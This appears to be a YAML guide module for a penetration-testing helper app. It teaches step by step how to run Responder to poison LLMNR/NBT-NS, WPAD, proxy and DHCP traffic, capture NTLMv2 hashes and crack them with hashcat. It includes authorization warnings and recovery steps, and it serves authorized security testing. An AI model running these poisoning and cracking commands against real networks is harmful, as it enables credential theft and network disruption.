tool_id: responder
display_name: "Responder"
binary_candidates: [responder]
categories: [network, mitm, exploitation]
os_profile: kali
one_liner: "Answers broadcast name-resolution requests (LLMNR/NBT-NS/mDNS) to capture Windows credentials."
authorization_gate: true
authorization_text: >
  Responder poisons name resolution for EVERY device on the network segment, not just one
  target — it answers broadcast/multicast traffic from any host that mistypes a name or
  can't resolve one. This can capture credentials from machines that were never meant to be
  in scope, and some modes (DHCP, rogue WPAD proxy) can disrupt normal network traffic. Only
  run this on networks you own or have explicit written authorization to test, and confirm
  your authorization covers the whole segment, not just a single host. Continue?
flows:
  - flow_id: guided
    title: "Guided first capture (START HERE)"
    goal: "From picking an interface to a captured hash — passive first, then live poisoning."
    command_builder_id: responder
    slots: [PROGRAM, ENV_INTERFACE, ACTION_OPTIONS]
    steps:
      - step_id: g1
        title: "Pick your network interface"
        slot_target: ENV_INTERFACE
        glossary_refs: []
        explanation:
          what: "Responder needs to know which network interface to listen and answer on — the one connected to the segment you're authorized to test."
          why: "Responder only poisons traffic it can see. The wrong interface means silence, not safety — always confirm which segment you're actually on."
          where: "-I <interface> is required on every run."
        find_it: "Run `ip a` and find your active interface (e.g. eth0, wlan0) — the one with an inet address on the authorized network."
        command_anatomy:
          - {token: "ip", does: "the networking tool"}
          - {token: "a", does: "show all interfaces and their addresses"}
        try_this: "ip a"
        success_criteria: "You can identify the interface name (e.g. eth0) connected to your authorized network."
        expected_output: |
          2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 ...
              inet 192.168.1.24/24 brd 192.168.1.255 scope global dynamic eth0
        alternatives:
          - trigger: "no interface shows an inet address"
            cause: "Not connected, or on the wrong network."
            fix: "Connect to the authorized network segment first; check with `ip link` for a carrier."
            check: "ip a shows an inet address on the right subnet."
      - step_id: g2
        title: "Start in Analyze mode first (passive, no poisoning)"
        slot_target: ACTION_OPTIONS
        glossary_refs: [llmnr, nbt_ns]
        explanation:
          what: "`-A` (--analyze) runs Responder passively: it watches LLMNR/NBT-NS/mDNS broadcast traffic and reports what it sees, but never sends a poisoned answer."
          why: "This confirms broadcast name-resolution traffic actually exists on this segment, and shows you what Responder would respond to, before you switch on real poisoning."
          where: "ACTION_OPTIONS; -A."
        find_it: "Use the interface from step 1. This needs root (raw sockets)."
        command_anatomy:
          - {token: "sudo", does: "root — Responder binds low ports and raw sockets"}
          - {token: "responder", does: "the program"}
          - {token: "-I <interface>", does: "the interface from step 1 — you type this in"}
          - {token: "-A", does: "analyze mode — passive, never poisons"}
          - {token: "-v", does: "verbose output"}
        try_this: "sudo responder -I <interface> -A -v"
        success_criteria: "Requests print as they're seen (e.g. LLMNR/NBT-NS queries) with no poisoned replies sent."
        expected_output: |
          [Analyze mode: ON]
          [*] [LLMNR]  Request by 192.168.1.50 for fileserver, ignoring (Analyze Mode)
          [*] [NBT-NS] Request by 192.168.1.52 for WORKGROUP<00>, ignoring (Analyze Mode)
        alternatives:
          - trigger: "Permission denied / socket errors"
            cause: "Not run as root, or another service already bound to a needed port."
            fix: "Run with sudo. If it's a port conflict, check what's using it: `sudo ss -tulpn | grep -E ':(53|445|139|389)'`."
            check: "Responder starts and its banner prints with no bind errors."
          - trigger: "nothing prints at all"
            cause: "No broadcast name-resolution traffic on this segment right now, or the wrong interface."
            fix: "Confirm the interface (step 1); a client mistyping a hostname/share triggers this — wait, or generate one yourself in a lab."
            check: "Requests eventually appear."
      - step_id: g3
        title: "Turn on real poisoning"
        slot_target: ACTION_OPTIONS
        destructive: true
        recovery: "Ctrl+C stops Responder immediately — poisoning stops the moment the process exits."
        glossary_refs: [poisoning]
        explanation:
          what: "Dropping `-A` and running `-I <interface> -v` switches Responder from watching to answering: it now poisons LLMNR/NBT-NS/mDNS lookups on the WHOLE segment, directing clients to authenticate to you."
          why: "This is the actual attack — it's what captures hashes. Because it answers ANY broadcast lookup failure on the segment, it can affect machines that were never your intended target, not just one host. That's why scope and authorization matter more here than for almost any other tool in this app."
          where: "ACTION_OPTIONS; same as step 2 without -A."
        find_it: "Same interface as before. Keep -v so you can see captures live."
        command_anatomy:
          - {token: "sudo responder -I <interface>", does: "same as step 2, but without -A"}
          - {token: "-v", does: "verbose — show captures as they happen"}
        try_this: "sudo responder -I <interface> -v"
        success_criteria: "Poisoned answers and captured hashes print as clients fall for them."
        expected_output: |
          [+] Listening for events...
          [SMB] NTLMv2-SSP Client   : 192.168.1.50
          [SMB] NTLMv2-SSP Username : CORP\jdoe
          [SMB] NTLMv2-SSP Hash     : jdoe::CORP:1122334455667788:...
        alternatives:
          - trigger: "no captures after a reasonable wait"
            cause: "No broadcast name-resolution failures are happening on the segment right now."
            fix: "This is expected on a quiet network — it captures opportunistically. In a lab, mistype a share name from another host to trigger it."
            check: "A capture appears in the terminal and in the logs (step 4)."
      - step_id: g4
        title: "Read what you captured"
        slot_target: null
        explanation:
          what: "Responder writes every captured hash/credential to files under its logs directory, named by protocol and source IP (e.g. SMB-NTLMv2-192.168.1.50.txt)."
          why: "The live terminal output scrolls by — the log files are the durable record you'll actually crack or report from."
          where: "Fixed location: /usr/share/responder/logs/ on Kali's packaged install."
        find_it: "List the logs directory, then read the specific hash file for the client you saw capture."
        command_anatomy:
          - {token: "ls", does: "list files"}
          - {token: "/usr/share/responder/logs/", does: "Responder's log directory on Kali"}
        try_this: "ls /usr/share/responder/logs/"
        success_criteria: "Files like SMB-NTLMv2-<IP>.txt or HTTP-NTLMv2-<IP>.txt exist for what you captured."
        expected_output: |
          Responder-Session.log
          SMB-NTLMv2-192.168.1.50.txt
        alternatives:
          - trigger: "directory doesn't exist / is empty"
            cause: "Nothing captured yet."
            fix: "Run Responder again and wait for a capture (step 3); on Kali the packaged binary always cd's into /usr/share/responder/ first, so logs always land there regardless of where you launched it from."
            check: "The logs directory has files after a capture."
  - flow_id: crack
    title: "Crack a captured hash (reference)"
    goal: "Take a captured NTLMv2 hash into hashcat for offline cracking."
    command_builder_id: responder
    slots: [PROGRAM]
    steps:
      - step_id: c1
        title: "hashcat -m 5600 against the captured hash file"
        slot_target: null
        glossary_refs: [ntlmv2]
        explanation:
          what: "NetNTLMv2 hashes (what Responder captures from SMB/HTTP/etc.) crack with hashcat mode -m 5600, against a wordlist."
          why: "A captured hash isn't a password — cracking it offline is the next step toward one, if the real password is weak enough to be in your wordlist."
          where: "This is a hashcat command, not Responder — see the hashcat tool module for the full guide."
        find_it: "The hash file from step 4 (e.g. SMB-NTLMv2-<ip>.txt) and a wordlist (rockyou.txt ships on Kali under /usr/share/wordlists/)."
        command_anatomy:
          - {token: "hashcat", does: "the cracking tool"}
          - {token: "-m 5600", does: "hash type: NetNTLMv2"}
          - {token: "/usr/share/responder/logs/SMB-NTLMv2-<ip>.txt", does: "the captured hash file — you fill in the IP"}
          - {token: "/usr/share/wordlists/rockyou.txt", does: "the wordlist to try"}
        try_this: "hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-<ip>.txt /usr/share/wordlists/rockyou.txt"
        success_criteria: "hashcat reports a cracked password, or exhausts the wordlist without one."
        expected_output: |
          jdoe::CORP:1122334455667788:...:8899aabbccddeeff:...:Password123
        alternatives:
          - trigger: "Exhausted (no cracks)"
            cause: "The password isn't in the wordlist."
            fix: "Try a bigger wordlist or rules (-r) — see the hashcat tool for details."
            check: "—"
  - flow_id: advanced_high_risk
    title: "Advanced poisoning modes (high risk, reference)"
    goal: "Go beyond LLMNR/NBT-NS: rogue proxy auth capture, forced WPAD auth, and DHCP poisoning — each riskier and noisier than the guided flow's default poisoning."
    command_builder_id: responder
    slots: [PROGRAM, ENV_INTERFACE, ACTION_OPTIONS]
    steps:
      - step_id: adv1
        title: "Rogue proxy authentication capture (-P)"
        slot_target: ACTION_OPTIONS
        destructive: true
        recovery: "Ctrl+C stops Responder immediately. -P captures real credentials from anything that tries to use a proxy on this segment — treat any captured creds exactly like the guided flow's captures: authorized scope only, handle and delete the logs responsibly."
        glossary_refs: [rogue_proxy_auth]
        explanation:
          what: "`-P` (--ProxyAuth) makes Responder force NTLM or Basic proxy authentication from any client that attempts to use a proxy on the network — Responder's own help calls this out as a standout, 'Highly effective' feature."
          why: "Some clients (scripts, services, background apps) never send an LLMNR/NBT-NS lookup at all, so the guided flow's poisoning never touches them — but almost everything that goes through a proxy WILL respond to a proxy-auth challenge, so -P captures credentials the default flow misses entirely."
          where: "ACTION_OPTIONS; cannot be combined with -w (rogue WPAD proxy) — Responder's own help says so, and this app enforces it too."
        find_it: "Same interface as the guided flow. Make sure 'Start rogue WPAD proxy' is switched off — it conflicts with this mode."
        command_anatomy:
          - {token: "sudo responder -I <interface>", does: "same base command as the guided flow"}
          - {token: "-P", does: "force rogue proxy authentication capture"}
          - {token: "-v", does: "verbose — see captures live"}
        try_this: "sudo responder -I <interface> -P -v"
        success_criteria: "Proxy-auth attempts from clients on the segment are captured and printed, without needing any LLMNR/NBT-NS lookup to happen first."
        expected_output: |
          [+] Listening for events...
          [PROXY] NTLM Auth  : CORP\jdoe
          [PROXY] NTLM Hash  : jdoe::CORP:1122334455667788:...
        alternatives:
          - trigger: "\"can't use with -w\" or a similar conflict message"
            cause: "-P and -w (rogue WPAD proxy) are mutually exclusive in Responder itself."
            fix: "Run with only one of -P or -w active at a time — turn off WPAD to use Proxy auth capture."
            check: "Re-run with -P alone (no -w)."
          - trigger: "no captures after a reasonable wait"
            cause: "No client on the segment tried to use a proxy during that window."
            fix: "This is opportunistic, same as the guided flow — a proxy-using client (browser, updater, script) has to actually try to connect. In a lab, configure a test client to use a proxy."
            check: "Wait longer, or trigger a proxy connection yourself in a lab."
      - step_id: adv2
        title: "Force authentication on WPAD retrieval (-F)"
        slot_target: ACTION_OPTIONS
        destructive: true
        recovery: "Ctrl+C stops Responder immediately. -F can trigger a VISIBLE authentication prompt on the victim's machine — far noisier/more detectable than passive poisoning. Authorized scope only, and consider whether a visible prompt could alarm real users before using it on a live engagement."
        glossary_refs: [wpad]
        explanation:
          what: "`-F` (--ForceWpadAuth) makes Responder require NTLM/Basic authentication when a client fetches the wpad.dat proxy-configuration file, instead of serving it freely."
          why: "This can pull a credential out of a client that would otherwise just silently accept the proxy config — but it can also pop a visible login prompt on the user's screen, a real tell that something is wrong. It's a deliberate trade-off: more captures, more chance of being noticed."
          where: "ACTION_OPTIONS; typically combined with -w (start the rogue WPAD proxy) so there's something to force auth on."
        find_it: "Same interface. Usually paired with -w so Responder is actually serving wpad.dat to force auth on."
        command_anatomy:
          - {token: "sudo responder -I <interface>", does: "same base command"}
          - {token: "-w", does: "start the rogue WPAD proxy"}
          - {token: "-F", does: "force NTLM/Basic auth on wpad.dat retrieval"}
          - {token: "-v", does: "verbose"}
        try_this: "sudo responder -I <interface> -w -F -v"
        success_criteria: "Clients fetching WPAD are challenged for authentication, and captures print."
        expected_output: |
          [+] Listening for events...
          [WPAD] NTLMv2 Client   : 192.168.1.55
          [WPAD] NTLMv2 Username : CORP\asmith
        alternatives:
          - trigger: "a visible login prompt appeared on a test machine and startled the user"
            cause: "That's -F working as documented — Responder's own help says it 'may show prompt'."
            fix: "Expected behaviour, not a bug. Weigh stealth vs capture rate before using -F on a live engagement, and disclose to your point of contact if a visible prompt could alarm real users."
            check: "Not a fault — a known trade-off of this flag."
          - trigger: "no captures"
            cause: "No client requested wpad.dat during the window, or the client doesn't use WPAD at all."
            fix: "Confirm test clients are set to 'auto-detect proxy settings' (the WPAD-using default on many Windows machines); wait longer."
            check: "Check the client's proxy settings for auto-detection."
      - step_id: adv3
        title: "DHCP / DHCPv6 poisoning (highest risk — network-wide disruption)"
        slot_target: ACTION_OPTIONS
        destructive: true
        recovery: "Ctrl+C stops Responder, but any client that already accepted a poisoned DHCP lease keeps using it until that lease expires or the client is reconfigured — this can leave hosts unable to reach the real network even after you stop. DHCP poisoning is advanced/high-risk even by Responder's already-high bar: lab networks or explicitly DHCP-scoped written authorization only, never on a network you can't afford to disrupt."
        glossary_refs: [dhcp_poisoning]
        explanation:
          what: "`-d` (--DHCP) injects a rogue WPAD entry into DHCP responses; `-D` (--DHCP-DNS) injects a rogue DNS server instead of WPAD; `--dhcpv6` does the IPv6 equivalent — Responder's own help literally warns '--dhcpv6 ... May disrupt network.'"
          why: "Unlike LLMNR/NBT-NS poisoning (which only answers requests that already failed), DHCP poisoning competes with the network's REAL DHCP server to answer new address requests. If a client accepts Responder's rogue offer instead of the real one, it can lose normal network/DNS connectivity entirely, not just have its credentials captured — disruptive to the whole segment, not just eavesdropping."
          where: "ACTION_OPTIONS. Needs sudo like everything else in Responder."
        find_it: "Only ever run this on a network where DHCP poisoning is explicitly within your written scope — most engagements do NOT authorize this specific technique even when general poisoning is allowed. When in doubt, don't."
        command_anatomy:
          - {token: "sudo responder -I <interface>", does: "same base command"}
          - {token: "-d", does: "enable DHCPv4 poisoning (injects WPAD via DHCP)"}
          - {token: "-v", does: "verbose"}
        try_this: "sudo responder -I <interface> -d -v"
        success_criteria: "DHCP-related captures/events print — ONLY run this if you've confirmed DHCP poisoning is explicitly in scope."
        expected_output: |
          [+] Listening for events...
          [DHCP] New DHCP lease poisoned for 192.168.1.77
        alternatives:
          - trigger: "a host on the network lost connectivity during/after testing"
            cause: "It likely accepted a poisoned DHCP lease and is now configured with Responder's rogue settings instead of the real network's."
            fix: "Stop Responder immediately (Ctrl+C); have the affected host release/renew its DHCP lease to get a legitimate one back — e.g. `sudo dhclient -r && sudo dhclient` on Linux, `ipconfig /release && ipconfig /renew` on Windows."
            check: "The host regains normal connectivity after a DHCP renew."
          - trigger: "no visible effect"
            cause: "No client requested a new DHCP lease during the window — existing leases aren't touched until they renew."
            fix: "This is expected — DHCP poisoning only affects NEW lease requests, not already-leased hosts. Wait for a lease renewal or a new device joining, or accept this is a narrow-window technique."
            check: "Not a failure — timing-dependent by design."
      - step_id: adv4
        title: "Spoof the poisoning source address (-e / -6)"
        slot_target: ACTION_OPTIONS
        destructive: true
        recovery: "Ctrl+C stops Responder immediately. Same authorization requirements as any other poisoning mode on this segment — authorized network/scope only."
        explanation:
          what: "`-e <IP>` makes Responder's poisoned answers claim to come from a different IPv4 address than the machine actually running Responder; `-6 <IPv6>` does the same for IPv6."
          why: "Useful when you want poisoned traffic directed somewhere other than your own interface's address — e.g. a separate listener box, or to make the poisoning source less obviously 'the pentester's laptop' in logs."
          where: "ACTION_OPTIONS."
        find_it: "The IP you want poisoned traffic to appear to come from — it must actually be reachable/yours on this network for captures to work, not an arbitrary address."
        command_anatomy:
          - {token: "sudo responder -I <interface>", does: "same base command"}
          - {token: "-e 192.168.1.99", does: "poison using this IPv4 address instead of the interface's own"}
          - {token: "-v", does: "verbose"}
        try_this: "sudo responder -I <interface> -e 192.168.1.99 -v"
        success_criteria: "Poisoned answers reference the spoofed IP instead of your real interface address."
        expected_output: |
          [+] Listening for events...
          [*] Poisoning answers with IP: 192.168.1.99
        alternatives:
          - trigger: "no captures / clients don't respond"
            cause: "The spoofed IP isn't actually reachable, or isn't yours — clients will try to authenticate to an address that doesn't lead back to Responder."
            fix: "Use an IP you genuinely control and that's reachable on this segment, or drop -e and use your real interface address."
            check: "Confirm the spoofed IP is one you own/control on this network."
quick_build:
  builder: responder
  title: "Quick start"
  fields:
    - field_id: iface
      label: "Interface (-I)"
      type: string
      required: true
      placeholder: "eth0"
    - field_id: analyze
      label: "Analyze mode only, no poisoning (-A)"
      type: bool
      default: true
    - field_id: verbose
      label: "Verbose (-v)"
      type: bool
      default: true
    - field_id: basic
      label: "Force HTTP Basic auth, cleartext (-b)"
      type: bool
    - field_id: wpad
      label: "Start rogue WPAD proxy (-w)"
      type: bool
    - field_id: force_wpad_auth
      label: "Force NTLM/Basic auth on WPAD retrieval (-F)"
      type: bool
      help: "Requires authentication before serving wpad.dat instead of handing it over freely. Can show a visible login prompt on the victim's screen — noisier than passive WPAD alone."
    - field_id: proxy_auth
      label: "Force rogue proxy authentication capture (-P)"
      type: bool
      help: "Responder's own standout feature — captures NTLM/Basic creds from anything that tries to use a proxy, even apps LLMNR/NBT-NS poisoning can't reach. Cannot be combined with 'Start rogue WPAD proxy' above."
    - field_id: dhcp
      label: "Enable DHCPv4 poisoning (-d)"
      type: bool
      help: "Injects WPAD into DHCP responses for the whole segment. Disruptive to the network's real DHCP service, not just eavesdropping — advanced/high-risk."
    - field_id: dhcp_dns
      label: "Inject rogue DNS server via DHCP instead of WPAD (-D)"
      type: bool
      help: "Same DHCP-poisoning risk as above, but injects a rogue DNS server instead of WPAD."
    - field_id: dhcpv6
      label: "Enable DHCPv6 poisoning (--dhcpv6)"
      type: bool
      help: "Responder's own help warns: 'May disrupt network.' Advanced/high-risk."
    - field_id: external_ip
      label: "Poison with a different IPv4 address (-e)"
      type: string
      placeholder: "192.168.1.99  (optional, advanced)"
    - field_id: external_ip6
      label: "Poison with a different IPv6 address (-6)"
      type: string
      placeholder: "optional, advanced"
